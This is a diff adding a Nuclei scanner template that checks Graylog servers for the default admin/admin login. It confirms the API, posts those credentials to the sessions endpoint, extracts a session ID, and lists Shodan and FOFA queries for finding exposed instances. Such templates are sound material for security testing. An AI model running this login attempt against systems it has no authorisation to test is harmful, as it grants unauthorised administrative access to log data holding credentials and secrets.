@@ -1,0 +1,77 @@
+id: graylog-default-login
+
+info:
+  name: Graylog - Default Login
+  author: 0x_Akoko,0xBassia
+  severity: high
+  description: |
+    Graylog instance is accessible with default admin credentials (admin/admin). This provides full administrative access to the log management platform, including the ability to read all ingested logs, create inputs, configure pipelines, and manage users.
+  impact: |
+    An attacker with admin access to Graylog can read all collected log data which may contain credentials, API keys, internal IPs, and sensitive business information. They can also create new inputs to intercept future log data or modify pipelines to redirect/suppress logs.
+  remediation: |
+    Change the default root_password_sha2 in the Graylog server.conf configuration file. Use a strong, unique password for the admin account.
+  reference:
+    - https://go2docs.graylog.org/current/setting_up_graylog/rest_api.html
+    - https://docs.graylog.org/docs/server-conf
+    - https://docs.graylog.org/docs/authentication
+    - https://archivedocs.graylog.org/en/2.5/pages/installation/virtual_machine_appliances.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 9.1
+    cwe-id: CWE-798
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: graylog
+    product: graylog
+    shodan-query: 'title:"Graylog Web Interface"'
+    fofa-query: 'app="Graylog" || title="Graylog Web Interface"'
+  tags: default-login,graylog,logging
+
+variables:
+  username: "admin"
+  password: "admin"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /api/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+    matchers:
+      - type: dsl
+        internal: true
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains_all(body, "\"cluster_id\"", "\"node_id\"", "\"version\"")'
+        condition: and
+
+  - raw:
+      - |
+        POST /api/system/sessions HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+        X-Requested-By: nuclei
+
+        {"username":"{{username}}","password":"{{password}}","host":""}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains_all(body, "\"session_id\"", "\"valid_until\"")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: session_id
+        part: body
+        regex:
+          - '"session_id"\s*:\s*"([^"]+)"'
+# digest: 4a0a00473045022100e00306b41b81eea00c263b49f012117e604bb7537173fb5fac66eec0538a801402205d8125a741df7c9b3d9558186a257f48dd04d8a1e5f7e89364cb10478d576de1:922c64590222798bb761d5b6d8e72950
